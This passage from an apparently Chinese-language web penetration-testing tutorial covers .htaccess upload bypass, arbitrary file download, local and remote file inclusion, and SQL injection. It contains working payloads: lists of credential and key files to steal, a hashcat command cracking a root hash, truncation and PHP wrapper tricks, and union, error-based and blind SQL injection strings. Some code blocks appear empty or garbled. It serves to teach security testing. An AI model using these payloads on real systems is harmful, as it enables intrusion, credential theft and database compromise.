+<a class=header-anchor href=#135-htaccess-%e7%bb%95%e8%bf%87></a></h4><p>htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现网页 301 重定向、自定义 “404 错误页面”、改变文件扩展名、允许 / 阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。在文件上传中 htaccess 是一个特殊的文件，在这些文件中写入指定的内容也能将文件解析为 php，htaccess 后缀的文件便是这类特殊的文件，当发现上传的功能点没有做这个文件的限制时，便可直接利用。 首先，确保本地文件在日常查看时能够编辑文件的后缀名；其次，新建一个文档，将该文档命名为. htaccess，并编辑写入以下指定内容。.htaccess 文件如下图所示</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562843_64a56c9bd6143b6014faf.jpg!small?1688562844056 alt></p><p>                                                                                                   .htaccess 文件</p><p>然后，将写有一句话木马的 php 文件的后缀改为 jpg 等允许上传的文件格式。 先上传特殊文件，再上传包含一句话木马的文件，获取路径之后，加上参数访问。浏览器访问如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562903_64a56cd724f5ed7ce7642.jpg!small?1688562903310 alt></p><p>                                                                                                        浏览器访问</p><p>使用蚁剑工具连接如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562923_64a56cebec9ba7587504b.jpg!small?1688562924283 alt></p><p>                                                                        蚁剑工具连接</p><h2 id=2-文件下载漏洞>2 文件下载漏洞
+<a class=header-anchor href=#2-%e6%96%87%e4%bb%b6%e4%b8%8b%e8%bd%bd%e6%bc%8f%e6%b4%9e></a></h2><h3 id=21-漏洞简介>2.1 漏洞简介
+<a class=header-anchor href=#21-%e6%bc%8f%e6%b4%9e%e7%ae%80%e4%bb%8b></a></h3><p>一些系统因为业务需求，网站需要提供文件查看或下载的功能。如果对用户查看或下载的文件不做限制，那么用户就能够查看或下载任意的文件，可以是源文件、敏感文件等。 网站代码本身存在读取文件的函数调用，且输出的文件内容是任意文件，这是 “读取漏洞” 的前提条件，如果用户下载时读取文件的路径可控，传递的文件路径参数未校验或校验不严，就可能会触发文件下载漏洞。 实战中还可以下载服务器上的敏感文件，如脚本代码、服务及系统配置文件等，这样可以得到代码以做进一步的代码审计，发现更多可利用漏洞。</p><h3 id=22-漏洞利用>2.2 漏洞利用
+<a class=header-anchor href=#22-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8></a></h3><h4 id=221-漏洞特征发现>2.2.1 漏洞特征发现
+<a class=header-anchor href=#221-%e6%bc%8f%e6%b4%9e%e7%89%b9%e5%be%81%e5%8f%91%e7%8e%b0></a></h4><p>在实际的渗透测试中，需要关注 URL 的一些参数。如果 URL 当中存在一些诸如 file、path 等参数的时候，且这些参数可控，就可以尝试利用这些参数来下载目标服务器上指定可下载文件以外的其他文件，如 / etc/hosts、/etc/passwd 等，成功下载其他文件即表示漏洞存在。 file、path、data、filepath、readfile、data、url、realpath 是文件下载漏洞的特征参数，在渗透测试的时候要重点关注这些参数。</p><h4 id=222-漏洞简单验证>2.2.2 漏洞简单验证
+<a class=header-anchor href=#222-%e6%bc%8f%e6%b4%9e%e7%ae%80%e5%8d%95%e9%aa%8c%e8%af%81></a></h4><p>不同系统中，文件下载漏洞验证方法稍有区别，Windows 系统下可以尝试下载如下文件：C：\Windows\win.ini。 win.ini 文件是每个 Windows 系统都存在的，主要记录了 Windows 系统的一些基本配置情况。读取 win.ini 文件如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562950_64a56d06b9d52613b47a5.jpg!small?1688562950919 alt></p><p>                                                                                            读取 win.ini 文件</p><p>在 Linux 系统下可选的文件就多一些。可以尝试读取 / etc/passwd 文件，这个文件记录着用户的一些基本属性；也可以尝试读取 / etc/hosts 文件，这里记录着本地的域名 IP 的对应关系。如图 4-25 所示，为读取 / etc/passwd 文件。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562969_64a56d1999c1e2ffbffca.jpg!small?1688562969725 alt></p><p>                                                                                   读取 / etc/passwd 文件</p><h4 id=223-常见的敏感文件>2.2.3 常见的敏感文件
+<a class=header-anchor href=#223-%e5%b8%b8%e8%a7%81%e7%9a%84%e6%95%8f%e6%84%9f%e6%96%87%e4%bb%b6></a></h4><p>如果目标网站真的存在文件包含漏洞，这个时候可以重点关注一些系统的敏感文件，通过下载这些敏感文件进一步获取更多的敏感信息，下面分别列举一些不同平台下的文件下载思路。</p><ol><li>Windows 平台</li></ol><pre>C:\boot.ini                                # 查看系统版本
+C:\Windows\System32\inetsrv\MetaBase.xml   # IIS配置文件C:\Windows\repair\sam                      # 存储系统初次安装的密码C:\Program Files\mysql\my.ini              # MySQL配置C:\Program Files\mysql\data\mysql\user.MYD # MySQL 
+rootC:\Windows\php.ini                     # php配置信息C:\Windows\my.ini                          # MySQL配置信息C:\Windows\win.ini                    # Windows系统的一个基本系统配置文件
+C:\Windows\System32\drivers\etc\hosts      # host文件位置</pre><ol><li>Linux 平台</li></ol><pre>/root/.ssh/authorized_keys       # 服务器公钥
+/root/.ssh/id_rsa                # SSH私钥
+/root/.ssh/known_hosts           # 记录每个访问计算机用户的钥
+/etc/passwd                      # 记录用户的一些基本属性
+/etc/shadow                      # 记录用户加密后的密码
+/etc/my.cnf                      # MySQL配置文件
+/etc/httpd/conf/httpd.conf       # Apache配置文件
+/root/.bash_history              # 用户历史命令记录件
+/root/.mysql_history             # MySQL历史命令记录文件
+/porc/self/cmdline               # 当前进程的cmdline参数
+/proc/net/arp                    # arp表，可以获得内网其他机器的地址
+/proc/net/route                  # 路由表信息
+/proc/net/tcp and /proc/net/udp  # 活动连接的信息
+/proc/net/ﬁb_trie                # 路由缓存
+/proc/version                   # 内核版本</pre><ol><li>Web 层的 Tips</li></ol><p>（1）可以尝试下载一些包含数据库配置的源代码文件，可能会直接拿到数据库的密码。 （2）Java Tomcat 部署的网站可以下载 web.xml 文件，然后进一步下载网站源代码。 （3）如果有日志文件可以尝试下载，可能会拿到管理员登录的敏感信息或者是后台登录地址等。 （4）也可以考虑下载全站源代码，本地进行白盒审计以发现更多的潜在漏洞。</p><h3 id=23-漏洞实战>2.3 漏洞实战
+<a class=header-anchor href=#23-%e6%bc%8f%e6%b4%9e%e5%ae%9e%e6%88%98></a></h3><h4 id=231-下载站点配置文件>2.3.1 下载站点配置文件
+<a class=header-anchor href=#231-%e4%b8%8b%e8%bd%bd%e7%ab%99%e7%82%b9%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6></a></h4><p>一般在源代码中可能会发现一些与网站相关的敏感信息，可以利用这些泄露的信息来进行高危漏洞挖掘和发现。 存在漏洞点的源代码如下图所示，在页面上发现了任意文件下载功能。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562996_64a56d34c65cf0dde1197.jpg!small?1688562996783 alt></p><p>                                                                                          存在漏洞点的源代码</p><p>在源代码文件中发现了 db.php 文件，显示数据库连接成功，可能是数据库连接的敏感文件。 数据库敏感文件如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563042_64a56d62493ae826d7ece.jpg!small?1688563042257 alt></p><p>                                                                                       数据库敏感文件</p><p>利用任意文件下载功能来读取 db.php 文件。 读取数据库文件如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563058_64a56d72e5d9dca117baf.jpg!small?1688563059096 alt></p><p>                                                                                          读取数据库文件</p><p>成功拿到数据库的密码后，接着对网站进行目录扫描，成功发现 phpmyadmin 的路径。用刚才拿到的用户名和密码登录，就可以执行任意 SQL 语句。</p><p>执行 SQL 语句如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563079_64a56d872f223ccbbc69e.jpg!small?1688563079405 alt></p><h4 id=232-下载-shadow-文件>2.3.2 下载 shadow 文件
+<a class=header-anchor href=#232-%e4%b8%8b%e8%bd%bd-shadow-%e6%96%87%e4%bb%b6></a></h4><p>用 Nmap 尝试对网站做简单的端口扫描，发现 ssh 服务是开启状态。根据前面发现的文件下载漏洞，我们可利用它来读取服务器的口令文件 / etc/shadow。 读取 / etc/shadow 文件如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563096_64a56d9865a854514d293.jpg!small?1688563096680 alt></p><p>                                                                            读取 / etc/shadow 文件</p><p>可以看到 root 用户密码被进行了 hash 加密，根据密码规则，判断加密方式应该是 sha512crypt$6$，SHA512（Unix）。尝试采用 hashcat 工具对加密文本进行弱口令暴力破解。先找到加密方式对应的 hashcat 目录。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563115_64a56dabd2adc32392f5e.jpg!small?1688563116539 alt></p><p>                                                                                    查看加密方式</p><p>然后加载弱口令文件，指定参数进行破解。</p><pre>hashcat -a 0 -m 1800 --force ’$6$Ak.Mk.W.$5C5UBsRVp/xVl/
+O/ZXtGHoCso8BEJgz3zc5XvERp8ZM50X9BnE5fMNXGUBAOr0m8O9ezo0OH0M
+dOCJW.tRZkI.’ pass_dic.txt -d 2 --potﬁle-disable</pre><p>成功破解 hash 如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563132_64a56dbc857e1f7c292ce.jpg!small?1688563132758 alt></p><p>                                                                                        成功破解 hash</p><p>拿到密码后对用户进行登录即可。</p><h2 id=3-文件包含漏洞>3 文件包含漏洞
+<a class=header-anchor href=#3-%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e></a></h2><h3 id=31-漏洞简介>3.1 漏洞简介
+<a class=header-anchor href=#31-%e6%bc%8f%e6%b4%9e%e7%ae%80%e4%bb%8b></a></h3><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含，其本身并没有危害。但是如果包含的文件参数可控，那么这样就会导致文件包含漏洞的产生。文件包含的表现形式可以分为本地文件包含与远程文件包含。</p><h4 id=311-本地文件包含>3.1.1 本地文件包含
+<a class=header-anchor href=#311-%e6%9c%ac%e5%9c%b0%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab></a></h4><p>能够访问并包含本地文件的漏洞，被称为本地文件包含漏洞（Local File Inclusion，LFI），本地文件包含多种利用方式，如向允许上传的文件中写入恶意代码并上传，利用文件上传漏洞包含目标文件、包含 PHP 上传的临时文件、在请求 URL 或者 UA 里面加入要执行的代码、恶意代码记录到日志后再包含 WebServer 的日志，上述几种都是常见的利用方式。</p><h3 id=32-远程文件包含>3.2 远程文件包含
+<a class=header-anchor href=#32-%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab></a></h3><p>PHP 不仅可以对本地文件进行包含，还可以对远程文件进行包含（Remote File Inclusion，RFI）。如果要使用远程包含功能，远程包含功能需要在 php.ini 配置文件中修改：</p><pre>allow_url_fopen = On
+allow_url_include = On</pre><p>远程文件包含与本地文件包含没有区别，无论是哪种扩展名，只要遵循 PHP 语法规范，PHP 解析器就会对其解析，因为远程的 URL 资源可以被恶意用户所控制，所以远程文件包含漏洞的危害也比较大。</p><h4 id=漏洞利用>漏洞利用
+<a class=header-anchor href=#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8></a></h4><h4 id=321-本地文件包含截断>3.2.1 本地文件包含截断
+<a class=header-anchor href=#321-%e6%9c%ac%e5%9c%b0%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%88%aa%e6%96%ad></a></h4><p>大多数开发者认为 PHP 中的包含漏洞比较好修复，固定扩展名即可，代码如下：</p><pre>error_reporting(0);
+if(isset($_GET[’ﬁle
+’])){    include $_GET[’
+ﬁle’] .".php"; }</pre><p>开发者在用户传入的参数后添加了. php 后缀限制，这样就会造成其他人无法任意地读取一些敏感文件信息，如此时传入？file=/etc/passwd，最后包含的效果如下：</p><pre>include(’/etc/passwd.php’);</pre><p>此时本地并不存在 / etc/passwd.php 文件，这就会导致包含失败，这种情况下怎么办呢？ 本地文件包含截断在 PHP 低版本的情况下有两种突破思路，分别是 00 截断和路径长度截断。</p><ol><li>00 截断 PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如，在连接字符串时，0 字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串。</li></ol><pre>?ﬁle=payload.txt\0</pre><p>因为浏览器 URL 并不支持 \，因此通过浏览访问的时候需要通过 urlencode 进行编码，变成：</p><pre>?ﬁle=payload.txt%00</pre><p>成功突破后缀限制后，文件包含成功。 00 截断包含 phpinfo 信息如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563159_64a56dd788b17681598ad.jpg!small?1688563160027 alt></p><p>                                                                    00 截断包含 phpinfo 信息</p><ol><li>路径长度截断 Windows 下目录最大长度为 256 字节，超出的部分会被丢弃；Linux 下目录最大长度为 4096 字节，超出的部分也会被丢弃。命令行下 “./” 表示当前路径。 所以可以使用大量的 “./” 来造成路径长度溢出，这样可以成功截断。 ?ﬁle=payload.txt././././././././ 超过一定数量的./././././ 路径长度截断包含 phpinfo 信息如下图所示。</li></ol><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563177_64a56de930df99cf8c3ea.jpg!small?1688563177444 alt></p><p>除了使用 “./” 表示当前目录，命令行下使用 “.” 也表示当前目录，所以也可以使用大量的 “.” 来进行目录长度溢出（点的数量不等于 2 的倍数）。 ?ﬁle=payload.txt&mldr;&mldr;.. 超过一定数量的&mldr;&mldr;.. 通过目录溢出包含 phpinfo 信息如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563189_64a56df50b2b1f7f25453.jpg!small?1688563189305 alt></p><p>                                                                                        通过目录溢出包含 phpinfo 信息</p><h4 id=322-远程文件包含截断>3.2.2 远程文件包含截断
+<a class=header-anchor href=#322-%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%88%aa%e6%96%ad></a></h4><p>发现目标网站存在远程文件包含漏洞，但是会在我们的文件名后面添加. xxx 后缀，这样就导致了远程文件包含失败。 远程文件包含失败的例子如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563209_64a56e09dc5871b9fa712.jpg!small?1688563210165 alt></p><p>                                                                                   远程文件包含失败的例子</p><p>这种情况下可以使用 “？” 和“#”进行截断。下表说明了 “？” 和“#”的区别</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563232_64a56e202826430c94512.jpg!small?1688563232170 alt></p><p>在我们要包含的 URL 后面添加 “？” 可以成功将. xxx 截断。 截断包含 phpinfo 信息如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563245_64a56e2dacd63ca7c062b.jpg!small?1688563245963 alt></p><p>同理使用 “#” 也是可以截断后面的. xxx 后缀的，只是在浏览器当中 “#” 要进行一次 URL 编码，即编码后为 %23。</p><h4 id=323-php-伪协议>3.2.3 PHP 伪协议
+<a class=header-anchor href=#323-php-%e4%bc%aa%e5%8d%8f%e8%ae%ae></a></h4><p>PHP 带有很多内置 URL 风格的封装协议（伪协议），将这些伪协议和文件包含漏洞配合使用往往会有意想不到的效果。</p><ol><li>php://filter 我们常使用 php：//filter 伪协议配合文件包含漏洞来读取文件的源码信息，因为文件包含会解析符合 PHP 语法规范的文件，借助 filter 伪协议就可以对目标文件进行编码输出，解码即可拿到目标文件的源代码。</li></ol><pre>?ﬁle=php://ﬁlter/read=convert.base64-encode/resource=文件
+  ?ﬁle=php://ﬁlter/convert.base64-encode/resource=文件</pre><p>包含成功会拿到一串 Base64 加密后的字符串，尝试解码可得到网站的源代码信息。 Base64 解码源文件如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563260_64a56e3c068d9ab4fb7b4.jpg!small?1688563260091 alt></p><ol><li>php://input 使用 php：//input 可以获取 POST 的数据流，如果满足远程文件包含条件，也可以直接执行 PHP 语句，即发送过去 PHP 代码，即可执行。 如果发送的数据是执行写入一句话木马的 PHP 代码，就会在当前目录下写入一个木马。</li></ol><pre>');?></pre><p>php：//input 写入 shell 如下图所示</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563271_64a56e47ea612f036ed19.jpg!small?1688563272212 alt></p><p>                                                                                         //input 写入 shel</p><p>此时木马就已经写入了 index.php 的同级目录下。同理还可以直接用命令执行，发送数据内容如下，以此来执行命令。</p><pre></pre><p>连接 shell 执行命令如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563286_64a56e5618582f14c0404.jpg!small?1688563286335 alt></p><p>                                                                          连接 shell 执行命令</p><p>data:// data：// 类似于 php：//input，也需要开启远程文件包含，如果和文件包含结合，可以将原本的 include 的文件流重新定向到用户可控制的输入流中，简单来说就是执行文件的包含方法包含了您的输入流，导致可以执行任意 payload。</p><pre>?ﬁle=data:text/plain,</pre><p>data 伪协议执行 phpinfo 如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563322_64a56e7a9506f038a62e1.jpg!small?1688563322829 alt></p><p>                                                                                  data 伪协议执行 phpinfo</p><h3 id=33-漏洞实战>3.3 漏洞实战
+<a class=header-anchor href=#33-%e6%bc%8f%e6%b4%9e%e5%ae%9e%e6%88%98></a></h3><h4 id=331-包含图片木马-getshell>3.3.1 包含图片木马 getshell
+<a class=header-anchor href=#331-%e5%8c%85%e5%90%ab%e5%9b%be%e7%89%87%e6%9c%a8%e9%a9%ac-getshell></a></h4><p>本章第一节的文件上传内容中，曾提到制作图片木马绕过文件内容检测，图片木马上传之后使用文件包含的方式进行 getshell。如果目标网站既能上传图片木马，又存在文件包含漏洞，则会产生巨大危害。 查看当前的 url：http：//xxxxxx/？header=header1.php&amp;page=upload.php，可以尝试性地去包含 etc/passwd 文件。如果能成功包含，说明存在文件包含漏洞。下图为成功包含 / etc/passwd 文件。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563346_64a56e92e9bfba5a1fd61.jpg!small?1688563347217 alt></p><p>                                                                            成功包含 / etc/passwd 文件</p><p>下图为上传图片木马文件</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563363_64a56ea3d3a08e9a29a2f.jpg!small?1688563364102 alt></p><p>                                                                                        上传图片木马文件</p><p>获取路径之后，通过文件包含漏洞去访问：http：//xxxxxx/？header=header1.php&amp;page=upload/7720210119071437.png。下图为包含图片木马文件成功执行 phpinfo。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563384_64a56eb829785dddfe91e.jpg!small?1688563384514 alt></p><p>                                                                           包含图片木马文件成功执行 phpinfo</p><h4 id=332-包含日志-getshell>3.3.2 包含日志 getshell
+<a class=header-anchor href=#332-%e5%8c%85%e5%90%ab%e6%97%a5%e5%bf%97-getshell></a></h4><p>在文件包含中，被包含的文件都会被当作 php 文件执行，若被包含的文件中存在 php 代码，则该代码会被当作 php 脚本执行。所以，在实战中，我们可以通过一些方式将 php 代码写入目标服务的日志中，若其存在文件包含漏洞，则可以通过文件包含漏洞去包含目标日志，从而 getshell。 访问目标地址，http：//xxxx/？file=sshlog.php，发现存在文件包含特性，尝试包含 etc/passwd。 包含 / etc/passwd 文件如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563401_64a56ec97455bd24d3e88.jpg!small?1688563401842 alt></p><p>                                                                                     包含 / etc/passwd 文件</p><p>目标开放了 Web 服务，开启 Burp Suite 抓包，抓取任意请求数据，写入 php 敏感文件。 写入 phpinfo 如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563417_64a56ed954c9e9450eb93.jpg!small?1688563417393 alt></p><p>                                                                                               写入 phpinfo</p><p>多次请求，将访问的信息写入 Web 服务的日志中，通过文件包含目标服务器的日志，http：//xxxxx/？file=/var/log/apache2/access.log。 文件包含写入的日志如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563432_64a56ee8199e3c6a00d56.jpg!small?1688563432403 alt></p><p>                                                                                 文件包含写入的日志</p><h2 id=4-sql-注入漏洞>4 SQL 注入漏洞
+<a class=header-anchor href=#4-sql-%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e></a></h2><h3 id=41-漏洞简介>4.1 漏洞简介
+<a class=header-anchor href=#41-%e6%bc%8f%e6%b4%9e%e7%ae%80%e4%bb%8b></a></h3><p>SQL 注入就是指 Web 应用程序没有对用户的输入进行校验，导致前端传入后端的参数可被用户控制，如果这个参数被带入数据库查询，就导致攻击者可以任意操作数据库查询语句，这种漏洞就称作 SQL 注入漏洞。 我们首先来看下面的场景，网站提供了 ID 查询，用户输入对应的 ID 即可显示出查询的结果。 基础 SQL 查询如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563449_64a56ef9767aa018e8b59.jpg!small?1688563449590 alt></p><p>这个网站的后端核心的查询数据语句如下： SELECT*FROM users WHERE id=&rsquo;$ GET[&ldquo;id&rdquo;]&rsquo; 用户提交对应的 ID，然后数据库就会根据这个 ID 去查询数据，但是假设有一个用户输入了如下恶意数据：</p><pre>1' and 1=1 -- -
+1' and 1=2 -- -</pre><p>这样带入数据库语句当中分别是如下效果：</p><pre>SELECT * FROM users WHERE id='1' and 1=1 -- -'
+SELECT * FROM users WHERE id='1' and 1=2 -- -'</pre><p>可以看出，第一组单引号闭合了原本的 SQL 语句中的单引号，然后通过 and 关键词拼接了自己的 1=1 和 1=2 SQL 语句，接着为了不破坏原本的语句闭合情况，使用了 “&mdash;” 注释掉了原本 SQL 语句中的单引号，这样就导致用户输入的 and 1=1 和 and 1=2 代码被执行，从而导致页面返回正确回显或错误回显，这就是 SQL 注入漏洞最基本的原理。</p><h3 id=42-漏洞利用>4.2 漏洞利用
+<a class=header-anchor href=#42-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8></a></h3><h4 id=421-sql-注入靶场>4.2.1 SQL 注入靶场
+<a class=header-anchor href=#421-sql-%e6%b3%a8%e5%85%a5%e9%9d%b6%e5%9c%ba></a></h4><p>要想注入学得好，靶场练习少不了。SQL 注入的靶场有很多，下面来一一介绍。</p><ol><li>sqli-labs 一个 SQL 注入专项练习靶场，一共有 65 关，基本上覆盖了 MySQL 注入的各种知识点，下图为 sqli-labs 部分关卡。</li></ol><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563462_64a56f0677215b24d68dd.jpg!small?1688563462876 alt></p><p>                                                                                       sqli-labs 部分关卡</p><p>2.DVWA DVWA 也是一个经典的 Web 漏洞靶场，里面包含 SQL 注入和盲注的低、中、高关卡，结合漏洞代码学习，也有助于提高对 SQL 注入漏洞的理解。下图为 DVWA 漏洞靶场。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563482_64a56f1ab5b99bf52099d.jpg!small?1688563482835 alt></p><p>                                                                                               DVWA 漏洞靶场</p><p>3.Web for pentester Web for pentester 也是一个包含常见 Web 漏洞的靶场，官方给的 iso 镜像文件部署起来也比较方便，这个靶场一共包含 9 个 SQL 注入的练习关卡。 pentester 漏洞靶场如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563499_64a56f2b98070d8fda191.jpg!small?1688563499902 alt></p><p>                                                                                 pentester 漏洞靶场</p><h4 id=422-sql-注入工具>4.2.2 SQL 注入工具
+<a class=header-anchor href=#422-sql-%e6%b3%a8%e5%85%a5%e5%b7%a5%e5%85%b7></a></h4><p>在实战当中使用纯手工的方式进行注入的效率低，所以一款顺手的工具必不可少。一般实战当中我们常使用 sqlmap 和 “超级 SQL 注入工具”，下面来分别介绍一下这两款工具。</p><ol><li>sqlmap sqlmap 是一款由 Python 语言编写的自动化检测与利用 SQL 注入漏洞的免费开源工具，支持对多种 SQL 注入的检测和利用，同时也完美支持 MySQL、Oracle、PostgreSQL、MSSQL、Access 等主流数据库。图 4-52 为 sqlmap 注入工具界面。</li></ol><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563514_64a56f3ab5595fcbe1ae8.jpg!small?1688563514856 alt></p><p>                                                                                 sqlmap 注入工具界面</p><ol><li>超级 SQL 注入工具 超级 SQL 注入工具是一款基于 HTTP 协议自组包的 SQL 注入工具，采用 C# 开发，直接操作 TCP 会话来进行 HTTP 交互，支持出现在 HTTP 协议任意位置的 SQL 注入，既支持各种类型的 SQL 注入，也支持 HTTPS 模式注入，操作起来比 sqlmap 简单很多，学习成本也低。下图为超级 SQL 注入工具页面。</li></ol><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563529_64a56f497093bf6e9cdf2.jpg!small?1688563529959 alt></p><p>                                                                            超级 SQL 注入工具页面</p><h4 id=423-sql-注入分类>4.2.3 SQL 注入分类
+<a class=header-anchor href=#423-sql-%e6%b3%a8%e5%85%a5%e5%88%86%e7%b1%bb></a></h4><ol><li>联合查询注入 如果目标网站存在 SQL 注入并且有回显数据，可以使用 UNION 关键词拼接第二个 SELECT 语句来进行查询。 假设原始的 SQL 语句字段数为 3，注入参数为 id，这种情况下我们输入：</li></ol><pre>?id=1' UNION SELECT 1,2,3 -- -</pre><p>此时页面是不会报错的，现在我们带入数据库的语句为：</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563549_64a56f5d56017965e86cb.jpg!small?1688563550649 alt></p><p>可以查询一个不存在的 ID，故意构造一个报错，然后将我们自己的 SELECT 1，2，3 数据外带出来。</p><pre>?id=-1' UNION SELECT 1,2,3 --+</pre><p>基础 SQL 注入测试如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563561_64a56f690768f074bbba3.jpg!small?1688563561496 alt></p><p>                                                                              基础 SQL 注入测试</p><p>此时的数据库查询语句如下：</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563584_64a56f8082f61fb044976.jpg!small?1688563584621 alt></p><p>这样 1，2，3 就会正常回显到页面当中，可以使用 MySQL 的一些函数，如 version()、database()、user() 等函数，这样就可以查询出此时数据库对应的版本信息、当前数据库信息及当前的数据库用户信息等，这就是联合查询注入最基本的漏洞原理。</p><ol><li>报错注入 如果网站开启了 SQL 报错日志功能，可以借助 MySQL 内置的 Bug 在报错的日志里带入用户的查询语句，这就是报错注入的由来。可以让 MySQL 报错的方法有很多，如最经典的 MySQL 的第 8652 号 Bug：Bug#8652 group by part of rand() returns duplicate keyerror，利用此 Bug 就可以在日志里带出用户输入的语句：</li></ol><pre>select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,ﬂoor(rand(0)*2)) a from information_schema.columns group by a;</pre><p>MySQL 交互界面中运行这个语句，报错注入图解效果如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563598_64a56f8e3fc39ae20f498.jpg!small?1688563598488 alt></p><p>                                                                      报错注入图解效果</p><p>可以看到 MySQL 虽然报错了，但是依然将 select user() 的查询结果返回到了 MySQL 的日志当中，这就是一个经典的报错注入。 类似的报错语句还有：</p><p>1)extractvalue</p><pre>select extractvalue(1,concat(0x7e,(select user()), 0x7e));</pre><p>下图为 extractvalue 函数的报错注入。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563617_64a56fa1562db8513db76.jpg!small?1688563617399 alt></p><p>extractvalue 函数的报错注入</p><p>2)updatexml</p><pre>select updatexml(1,concat(0x7e,(select user()),0x7e),1);</pre><p>下图为 updatexml 函数的报错注入。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563628_64a56faccfd08a744f8ee.jpg!small?1688563628998 alt></p><p>updatexml 函数的报错注入</p><p>3）双查询</p><pre>select * from (select NAME_CONST(version(),1),NAME_CONST (version(),1))x;</pre><p>下图为双查询的报错注入。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688563642_64a56fba909fabdf1c03a.jpg!small?1688563642653 alt></p><p>                                                                            双查询的报错注入</p><p>更多的报错注入的方法这里就不一一列举了。</p><ol><li>基于布尔类型的盲注 页面无法显示 SQL 查询的数据，但是当正确的查询语句和错误的查询语句返回的结果不一样的时候，这种情况下可以使用基于布尔类型的 “盲注”，通过页面的正确与否来判断查询的数据结果。 下面来看一下使用布尔类型“盲注” 常用的一些关键词函数。</li></ol><pre>and length(database())>7</pre><p>如果执行了上述语句页面返回正确，这表明当前数据库的长度是大于 7 位的，但是如果执行下面语句：</p><pre>and length(database())>8</pre><p>页面如果此时返回错误，则表明当前数据库的长度不大于 8，结合之前的数据库长度大于 7 可以推理出当前数据库的长度为 8，这样就是一个布尔类型盲注的推理过程，下面来一一列举使用布尔类型盲注的时候可能会有帮助的一些函数。 1）left 函数 left（s，n） ：返回字符串 s 的前 n 个字符。</p><pre>left(database(),1)>'a';
+  left(database(),1)>'z';
